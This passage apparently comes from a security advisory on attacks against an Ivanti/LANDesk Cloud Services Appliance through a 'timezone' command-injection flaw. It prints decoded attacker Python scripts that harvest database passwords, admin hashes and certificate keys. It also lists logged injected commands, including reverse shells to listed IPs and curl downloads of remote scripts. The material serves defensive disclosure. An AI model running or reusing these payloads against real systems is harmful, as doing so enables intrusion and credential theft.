<p>os.chdir("/tmp")<br>d = "/backups"<br>try:<br>&nbsp; &nbsp;r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; &nbsp;r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; &nbsp;dbpwd = re.findall("PGSQL_PW=(.*)", f.read())[0]<br>&nbsp; &nbsp;os.system('''export PGPASSWORD={};echo "delete from user_info where runas='Nobody'"|psql -d brokerdb -U gsbadmin'''.format(dbpwd))<br>&nbsp; &nbsp;if r:<br>&nbsp; &nbsp; &nbsp; &nbsp;p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; &nbsp; &nbsp; &nbsp;os.system("tar zxvf {}".format(r))<br>&nbsp; &nbsp; &nbsp; &nbsp;while True:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;m = os.popen("./{} '{}' '{}' '{}' root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exit()<br>&nbsp; &nbsp;else:<br>&nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd, 'ERROR', 'NO BACKUP')<br>}</p>
</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; &nbsp;if t and m:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; &nbsp;else:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = ''<br>&nbsp; &nbsp;os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; &nbsp;r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; &nbsp;r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; &nbsp;dbpwd = re.findall("PGSQL_PW=(.*)", f.read())[0]<br>&nbsp; &nbsp;os.system('''export PGPASSWORD={};echo "delete from user_info where runas='Nobody'"|psql -d brokerdb -U gsbadmin'''.format(dbpwd))<br>if r:<br>&nbsp; &nbsp;p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; &nbsp;os.system("tar zxvf {}".format(r))<br>&nbsp; &nbsp;while True:<br>&nbsp; &nbsp; &nbsp; &nbsp;for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exit()<br>else:<br>&nbsp; &nbsp;set_msg(dbpwd, 'ERROR', 'NO BACKUP')<br>}</td>
</tr>
</tbody>
</table>
<h3>Decoded datetime.php 'timezone' Exploit base64 Scripts</h3>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;5 01:09:59 REDACTED gsb[996]: /etc/php.ini<br>rewritten with new timezone: ';export PGPASSWORD=`cat /opt/landesk/broker/broker.conf | grep PGSQL_PW | cut -d '=' -f2-`;echo&nbsp;<br>"update user_info set organization='||/usr/bin/echo import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; if t and m:<br>&nbsp; &nbsp; &nbsp; msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; else:<br>&nbsp; &nbsp; &nbsp; msg = ''<br>&nbsp; os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; dbpwd = re.findall("PGSQL_PW=(.*)", f.read<br>())[0]<br>if r:<br>&nbsp; p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; os.system("tar zxvf {}".format(r))<br>&nbsp; while True:<br>&nbsp; &nbsp; &nbsp; for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit()<br>else:<br>&nbsp; set_msg(dbpwd, 'ERROR', 'NO BACKUP')<br>| /usr/bin/base64 -d | python||' where username='admin'"|psql -d brokerdb -U gsbadmin;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;5 01:47:01 REDACTED gsb[2599]: /etc/php.ini<br>rewritten with new timezone: ';/usr/bin/echo&nbsp;<br>import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; if t and m:<br>&nbsp; &nbsp; &nbsp; msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; else:<br>&nbsp; &nbsp; &nbsp; msg = ''<br>&nbsp; os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; dbpwd = re.findall("PGSQL_PW=(.*)", f.read<br>())[0]<br>if r:<br>&nbsp; p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; os.system("tar zxvf {}".format(r))<br>&nbsp; while True:<br>&nbsp; &nbsp; &nbsp; for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit()<br>else:<br>&nbsp; set_msg(dbpwd, 'ERROR', 'NO BACKUP') &nbsp;<br>| /usr/bin/base64 -d | python;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;5 02:14:08 REDACTED gsb[1273]: /etc/php.ini<br>rewritten with new timezone: ';export PGPASSWORD=`cat /opt/landesk/broker/broker.conf | grep PGSQL_PW | cut -d '=' -f2-`;echo&nbsp;<br>"update user_info set organization='||/usr/bin/echo import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; if t and m:<br>&nbsp; &nbsp; &nbsp; msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; else:<br>&nbsp; &nbsp; &nbsp; msg = ''<br>&nbsp; os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; dbpwd = re.findall("PGSQL_PW=(.*)", f.read<br>())[0]<br>if r:<br>&nbsp; p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; os.system("tar zxvf {}".format(r))<br>&nbsp; while True:<br>&nbsp; &nbsp; &nbsp; for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit()<br>else:<br>&nbsp; set_msg(dbpwd, 'ERROR', 'NO BACKUP')<br>| /usr/bin/base64 -d | python||' where username='admin'"|psql -d brokerdb -U gsbadmin;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;5 22:22:06 REDACTED gsb[9367]: /etc/php.ini<br>rewritten with new timezone: ';export PGPASSWORD=`cat /opt/landesk/broker/broker.conf | grep PGSQL_PW | cut -d '=' -f2-`;echo&nbsp;<br>"update user_info set organization='||/usr/bin/echo import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; if t and m:<br>&nbsp; &nbsp; &nbsp; msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; else:<br>&nbsp; &nbsp; &nbsp; msg = ''<br>&nbsp; os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; dbpwd = re.findall("PGSQL_PW=(.*)", f.read<br>())[0]<br>if r:<br>&nbsp; p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; os.system("tar zxvf {}".format(r))<br>&nbsp; while True:<br>&nbsp; &nbsp; &nbsp; for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit()<br>else:<br>&nbsp; set_msg(dbpwd, 'ERROR', 'NO BACKUP')<br>| /usr/bin/base64 -d | python||' where username='admin'"|psql -d brokerdb -U gsbadmin;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;6 02:39:11 REDACTED gsb[21266]: /etc/php.ini<br>rewritten with new timezone: ';/usr/bin/echo&nbsp;<br>import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; if t and m:<br>&nbsp; &nbsp; &nbsp; msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; else:<br>&nbsp; &nbsp; &nbsp; msg = ''<br>&nbsp; os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; dbpwd = re.findall("PGSQL_PW=(.*)", f.read<br>())[0]<br>if r:<br>&nbsp; p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; os.system("tar zxvf {}".format(r))<br>&nbsp; while True:<br>&nbsp; &nbsp; &nbsp; for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit()<br>else:<br>&nbsp; set_msg(dbpwd, 'ERROR', 'NO BACKUP') &nbsp;<br>| /usr/bin/base64 -d | python;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep&nbsp; 6 03:03:44 REDACTED gsb[11427]: /etc/php.ini<br>rewritten with new timezone: ';bash /tmp/Xa27efd2.tmp;' (1)<br>}</td>
</tr>
<tr>
<td>{<br>Sep&nbsp; 8 05:18:35 REDACTED gsb[5132]: /etc/php.ini<br>rewritten with new timezone: ';/sbin/backuptool --backup;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;8 05:19:34 REDACTED gsb[5325]: /etc/php.ini<br>rewritten with new timezone: ';/usr/bin/echo&nbsp;<br>import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; if t and m:<br>&nbsp; &nbsp; &nbsp; msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; else:<br>&nbsp; &nbsp; &nbsp; msg = ''<br>&nbsp; os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; dbpwd = re.findall("PGSQL_PW=(.*)", f.read<br>())[0]<br>if r:<br>&nbsp; p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; os.system("tar zxvf {}".format(r))<br>&nbsp; while True:<br>&nbsp; &nbsp; &nbsp; for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit()<br>else:<br>&nbsp; set_msg(dbpwd, 'ERROR', 'NO BACKUP') &nbsp;&nbsp;<br>| /usr/bin/base64 -d | python;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;8 10:37:35 REDACTED gsb[6196]: /etc/php.ini<br>rewritten with new timezone: ';nc REDACTED<br>80 -ssl -e /bin/bash;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;8 10:40:38 REDACTED gsb[8758]: /etc/php.ini<br>rewritten with new timezone: ';curl https://gggg.oyr2ohrm.eyes.sh<br>/;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;8 10:41:35 REDACTED gsb[7475]: /etc/php.ini<br>rewritten with new timezone: ';curl 98.98.54.209/a.sh -o /dev/shm/a.sh<br>;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;8 13:10:37 REDACTED gsb[22555]: /etc/php.ini<br>rewritten with new timezone: ';nc REDACTED<br>80 --ssl -e /bin/bash;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;8 13:21:06 REDACTED gsb[24954]: /etc/php.ini<br>rewritten with new timezone: ';nc REDACTED<br>80 --ssl -e /bin/bash;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep &nbsp;8 20:23:14 REDACTED gsb[1899]: /etc/php.ini<br>rewritten with new timezone: ';export PGPASSWORD=`cat /opt/landesk/broker/broker.conf | grep PGSQL_PW | cut -d '=' -f2-`;echo&nbsp;<br>"update user_info set organization='||/usr/bin/echo import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; if t and m:<br>&nbsp; &nbsp; &nbsp; msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; else:<br>&nbsp; &nbsp; &nbsp; msg = ''<br>&nbsp; os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; dbpwd = re.findall("PGSQL_PW=(.*)", f.read<br>())[0]<br>if r:<br>&nbsp; p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; os.system("tar zxvf {}".format(r))<br>&nbsp; while True:<br>&nbsp; &nbsp; &nbsp; for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit()<br>else:<br>&nbsp; set_msg(dbpwd, 'ERROR', 'NO BACKUP') &nbsp;&nbsp;<br>| /usr/bin/base64 -d | python||' where username='admin'"|psql -d brokerdb -U gsbadmin;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep 10 04:36:30 REDACTED gsb[16012]: /etc/php.ini<br>rewritten with new timezone: ';/usr/bin/echo&nbsp;<br>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("45.33.101.53<br>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'== | /usr/bin/base64 -d | /bin/bash;' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep 10 11:48:32 csa gsb[6829]: /etc/php.ini<br>rewritten with new timezone: ';/bin/<br>python -c 'import<br>socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("156.234.193.18",44345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);';' (1)<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>Sep 10 05:33:42 REDACTED gsb[17292]: /etc/php.ini<br>rewritten with new timezone: ';/usr/bin/echo&nbsp;<br>import os, re, time<br>os.chdir("/tmp")<br>d = "/backups/backup-09-01-2024_010101.tar.gz"<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; dbpwd = re.findall("PGSQL_PW=(.*)", f.read<br>())[0]<br>if os.path.exists(d):<br>&nbsp; os.system("tar zxf {}".format(d))<br>&nbsp; pwd = os.popen("export PGPASSWORD={};echo SELECT username,passwd FROM user_info | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().strip()<br>&nbsp; p = pwd.split(':')<br>&nbsp; k = os.popen("cat root/.certs/{}.0".format(p[1])).read().strip()<br>&nbsp; os.system('''export PGPASSWORD={};echo "INSERT INTO blockedcerts (blockedcerts_idn, core, hash, description, created) VALUES (1, '{}', '1', '{}', '2024-03-13 05:10:16.926012')"|psql -d brokerdb -U gsbadmin'''.format(dbpwd, k[0:200], k[200:700]))<br>&nbsp; os.system('''export PGPASSWORD={};echo "INSERT INTO blockedcerts (blockedcerts_idn, core, hash, description, created) VALUES (2, '{}', '2', '{}', '2024-03-13 05:10:16.926012')"|psql -d brokerdb -U gsbadmin'''.format(dbpwd, k[700:900], k[900:]))<br>&nbsp; os.system('''export PGPASSWORD={};echo "INSERT INTO blockedcerts (blockedcerts_idn, core, hash, description, created) VALUES (3, '{}', '3', '{}', '2024-03-13 05:10:16.926012')"|psql -d brokerdb -U gsbadmin'''.format(dbpwd, pwd[0:200], pwd[200:700]))<br>&nbsp; time.sleep(60)<br>&nbsp; os.system('''export PGPASSWORD={};echo "DELETE FROM blockedcerts"|psql -d brokerdb -U gsbadmin'''.format(dbpwd))<br>&nbsp; os.system("rm -rdf *;rm -rf *")== | /usr/bin/base64 -d | python;' (1)<br>}</td>
</tr>
</tbody>
</table>
<h2><strong>Appendix B: Sudo Commands</strong></h2>
<p>See <strong>Table 14</strong> for a list of known sudo commands executed by the threat actors.</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Command</th>
<th role="columnheader">Use</th>
</tr>
</thead>
<tbody>
<tr>
